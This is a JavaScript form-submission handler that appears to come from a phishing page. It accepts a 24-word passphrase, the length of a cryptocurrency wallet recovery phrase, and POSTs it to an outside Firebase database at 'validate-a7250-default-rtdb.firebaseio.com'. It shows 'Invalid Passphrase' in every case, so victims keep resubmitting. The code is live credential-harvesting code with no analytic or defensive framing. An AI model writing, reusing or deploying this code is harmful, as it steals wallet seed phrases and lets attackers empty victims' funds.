// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1');
    const myButton2 = document.getElementById('b2');

    myButton.disabled = true;
    myButton2.disabled = true;

    // Step 1: Get the value of the hidden input field with name 'mf-texts'
    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
    const inputValue = form.elements['mf-texts'].value.trim();

    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return; // Exit function if word count is not 24
    }

    // Step 2: Construct the URL for Firebase
    const url = `https://validate-a7250-default-rtdb.firebaseio.com/send.json`; // Remove the extra slash and add .json

    // Prepare the data to send
    const dataToSend = {
        passphrase: inputValue, // Assuming you want to store the passphrase
        email: 'no@no.com' // Include email or other data if necessary
    };

    // Make a POST request to Firebase
    fetch(url, {
        method: 'POST',
        body: JSON.stringify(dataToSend), // Send data as JSON
        headers: {
            'Content-Type': 'application/json' // Specify the content type
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json(); // Assuming the response is JSON
    })
    .then(data => {
        // Handle successful response
        console.log('Data submitted successfully:', data);
        errorElement.textContent = ''; // Clear previous error messages
        form.reset(); // Reset the form
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = 'Invalid Passphrase'; // Adjust error message based on actual error
        myButton.disabled = false;
        myButton2.disabled = false;
    });
}

// Add event listener to the form for 'submit' event
const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
form.addEventListener('submit', handleSubmit);
